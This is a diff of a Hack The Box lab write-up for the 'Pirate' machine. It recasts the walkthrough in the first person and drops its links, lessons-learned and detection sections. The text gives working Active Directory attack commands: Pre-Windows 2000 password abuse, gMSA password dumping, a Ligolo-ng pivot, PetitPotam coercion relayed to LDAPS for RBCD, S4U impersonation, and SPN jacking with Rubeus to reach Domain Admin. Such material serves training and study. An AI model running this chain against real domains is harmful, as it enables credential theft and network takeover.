@@ -9,51 +9,21 @@ avatar: assets/htb/pirate.png
 tags: [active-directory, pre2k, gmsa, ligolo, petitpotam, rbcd, s4u2proxy, spn-jacking, ntlm-relay]
 htb_url: https://app.hackthebox.com/machines/Pirate
 ---
+
 ## Summary
 
-Pirate is a multi-host Active Directory attack across two network segments. Initial access exploits **Pre-Windows 2000 compatible computer accounts**, where the password equals the lowercase machine name truncated to 14 characters. From a Pre2k computer account, the attacker reads a **gMSA** managed-password and pivots into a second segment via **Ligolo-ng**. Inside, **PetitPotam** coerces WEB01 to authenticate, which is **relayed to LDAPS** to write **RBCD** (msDS-AllowedToActOnBehalfOfOtherIdentity) granting MS01$ delegation rights over WEB01$. The chain finishes with **WriteSPN + S4U2Proxy + altservice**, impersonating Administrator on any service - including DC01 - for Domain Admin.
+Pirate is a Windows multi-host Active Directory attack spread across two network segments. My initial access exploits Pre-Windows 2000 compatible computer accounts, where the password equals the lowercase machine name truncated to 14 characters. From a Pre2k computer account I read a gMSA managed password and pivot into a second segment with Ligolo-ng. Inside, I use PetitPotam to coerce WEB01 to authenticate and relay that to LDAPS to write RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity), granting MS01$ delegation rights over WEB01$. The chain finishes with WriteSPN + S4U2Proxy + altservice, letting me impersonate Administrator on any service - including DC01 - for Domain Admin.
 
----
+## Enumeration
 
-## External Writeups
-
-- [HTB-Andres (Beehiiv)](https://htb-writeup.beehiiv.com/p/pirate-machine-hackthebox)
-- [4nuxd - Multi-Host AD Chain](https://4nuxd.one/writeups/pirate-hackthebox-walkthrough)
-- [Medium - T0NY_8 (Pre2k / gMSA / RBCD / WriteSPN)](https://medium.com/@zakariaelamraoui12/hackthebox-pirate-pre2k-gmsa-rbcd-writespn-and-the-road-to-domain-admin-19ec4afe2d80)
-- [GitHub: Zakaria - Pirate AD Lab Writeup](https://github.com/Zakariaelamraoui/pirate-AD_LAB_writeup/blob/main/HTB_Pirate_Writeup%20(2).md)
-- [unimtx85 - HTB Pirate Writeup](https://unimtx85.github.io/HTB_machines_writeups/HTB_Pirate_Writeup.html)
-- [The Pentesting Ninja (Protected)](https://blog.thepentesting.ninja/protected/htb-pirate/)
-- [CyberSecGuru: Mastering Pirate](https://thecybersecguru.com/ctf-walkthroughs/mastering-pirate-beginners-guide-from-hackthebox/)
-- [1337 Sheets - Pirate Hard (Feb 28, 2026)](https://1337sheets.com/hack-the-box-season-ten-htb-pirate-writeup-hard-weekly-feb/)
-
----
-
-## Key Techniques
-
-- **Pre-Windows 2000 machine accounts** with predictable passwords (`<lowercase-name>` truncated 14 chars)
-- "Pre-Windows 2000 Compatible Access" group grants null-session-like read on legacy objects
-- **gMSA** (Group Managed Service Account) password read via `KDS root key` + msDS-ManagedPassword DACL
-- **Ligolo-ng** TCP-IP tunneling for dual-NIC pivot
-- **PetitPotam** (MS-EFSRPC) authentication coercion
-- **NTLM Relay to LDAPS** (`ntlmrelayx --delegate-access`) to write RBCD
-- **RBCD (Resource-Based Constrained Delegation)** via `msDS-AllowedToActOnBehalfOfOtherIdentity`
-- **WriteSPN + altservice + S4U2Proxy** for "SPN jacking" lateral
-- `Rubeus s4u /altservice:` for arbitrary SPN impersonation
-
----
-
-## Attack Path
-
-### 1. Recon
+I start with a full port scan against the DC, which exposes the usual Active Directory service set:
 
 ```bash
 nmap -p- --min-rate=10000 -sV -sC pirate.htb
 # 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389  (DC1)
 ```
 
-### 2. Pre-Windows 2000 Accounts
-
-Enumerate legacy machine accounts (account name ending `$`, `userAccountControl = 4128`):
+With Kerberos, LDAP, SMB and WinRM all reachable, I enumerate legacy machine accounts - those with an account name ending in `$` and `userAccountControl = 4128`:
 
 ```bash
 impacket-GetADUsers -all -dc-ip pirate.htb pirate.htb/
@@ -61,14 +31,18 @@ nxc smb pirate.htb -u 'guest' -p '' --rid-brute 5000
 # discover legacy hosts: LEGACY01$, MS01$
 ```
 
-Pre-Windows 2000 password formula: **lowercase machine name (truncated to 14 chars)**:
+This surfaces the legacy hosts `LEGACY01$` and `MS01$`, both candidates for the Pre-Windows 2000 password formula.
+
+## Foothold
+
+Pre-Windows 2000 accounts carry a predictable password: the lowercase machine name truncated to 14 characters. I request a TGT for `ms01$` using that password and cache it:
 
 ```bash
 impacket-getTGT pirate.htb/ms01\$:'ms01' -dc-ip pirate.htb
 export KRB5CCNAME=ms01\$.ccache
 ```
 
-### 3. Read gMSA Password
+The "Pre-Windows 2000 Compatible Access" group grants `ms01$` a null-session-like read over legacy objects, which is enough to pull the gMSA managed password. The gMSA is only as safe as its KDS root key and the `PrincipalsAllowedToRetrieveManagedPassword` DACL, both of which let `ms01$` recover the NT hash for `gmsa$`:
 
 ```bash
 # As ms01$, dump gMSA via Pre-Windows 2000 group ACL
@@ -78,7 +52,7 @@ python3 gMSADumper.py -u 'ms01$' -p '' -d pirate.htb
 # Recover NT hash for gmsa$
 ```
 
-### 4. Pivot via Ligolo-ng
+The `gmsa$` account lives in a second network segment, so I tunnel into it with Ligolo-ng. I bring up the tun interface and proxy on the attacker side, drop the agent on a compromised host over WinRM, and add a route to the internal subnet:
 
 ```bash
 # Attacker
@@ -93,7 +67,11 @@ sudo ip link set ligolo up
 sudo ip route add 172.16.7.0/24 dev ligolo
 ```
 
-### 5. PetitPotam Coerce + NTLM Relay to LDAPS
+## Privilege Escalation
+
+### RBCD via PetitPotam relay to LDAPS
+
+With internal routing in place, I stand up `ntlmrelayx` targeting LDAPS with `--delegate-access`, then use PetitPotam (MS-EFSRPC) to coerce WEB01 into authenticating back to the relay listener. RBCD is attractive here because it is written as an attribute on the target rather than the impersonator, making it harder to spot:
 
 ```bash
 # Listen for relayed creds, target LDAPS, write RBCD
@@ -104,9 +82,11 @@ impacket-ntlmrelayx -t ldaps://dc01.pirate.htb \
 python3 PetitPotam.py 10.10.14.5 web01.pirate.htb -u 'gmsa$' -hashes :<NT>
 ```
 
-Relay output: `msDS-AllowedToActOnBehalfOfOtherIdentity` set to MS01$ on WEB01$.
+The relay sets `msDS-AllowedToActOnBehalfOfOtherIdentity` to MS01$ on WEB01$, giving MS01$ delegation over WEB01$.
 
-### 6. S4U2Self + S4U2Proxy
+### S4U2Self + S4U2Proxy onto WEB01
+
+I grab a TGT for MS01$ and run S4U to impersonate Administrator for `cifs/web01.pirate.htb`, then psexec in with the resulting ticket:
 
 ```bash
 # Get MS01$ TGT, then S4U
@@ -117,9 +97,9 @@ export KRB5CCNAME=Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
 impacket-psexec -k -no-pass web01.pirate.htb
 ```
 
-### 7. WriteSPN + S4U Altservice (SPN Jacking) to DC
+### WriteSPN + S4U altservice (SPN jacking) to DC
 
-On WEB01, an ACL grants WriteSPN over a DC service account. Add an arbitrary SPN and use `S4U2Proxy --altservice` to obtain a TGS for **any** service on DC01:
+On WEB01 an ACL grants WriteSPN over a DC service account. Any ACL that allows a `serviceprincipalname` write is effectively domain-admin when chained with S4U2Proxy. I add an arbitrary SPN to the DC service account, then use `Rubeus s4u` with `/altservice` to mint a TGS for any service on DC01:
 
 ```powershell
 Set-DomainObject -Identity 'svc-dc' -Set @{serviceprincipalname='HTTP/dc01.pirate.htb'}
@@ -128,23 +108,4 @@ Rubeus.exe s4u /user:svc-dc /rc4:<hash> /impersonateuser:Administrator \
 dir \\dc01.pirate.htb\C$
 ```
 
-Domain Admin / DA-equivalent access secured.
-
----
-
-## Lessons Learned
-
-- **Pre-Windows 2000 compatibility** is a 25-year-old setting still enabled in modern domains. Its password formula is one of the cheapest initial-access paths in AD.
-- **gMSA** is only as safe as the KDS root key and the **PrincipalsAllowedToRetrieveManagedPassword** DACL.
-- **PetitPotam + ntlmrelayx --delegate-access** remains the AD-relay one-two punch in 2026.
-- **RBCD vs. unconstrained delegation**: RBCD is harder to detect because it's set as an attribute on the **target**, not the impersonator.
-- **WriteSPN + altservice** is the modern "Kerberos golden hammer" - any ACL that allows `serviceprincipalname` write is functionally domain-admin if combined with S4U2Proxy.
-
----
-
-## Detection
-
-- LDAP modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity`.
-- Pre-Windows 2000 account password set events (4724) on legacy `*$` objects.
-- Multiple LDAPS bind failures followed by a successful bind from a low-priv account = relay in progress.
-- `Rubeus.exe`, `Impacket-Toolkit`, `PetitPotam.py` execution / on-disk presence.
+Listing the DC's `C$` confirms Domain Admin equivalent access, completing the chain.
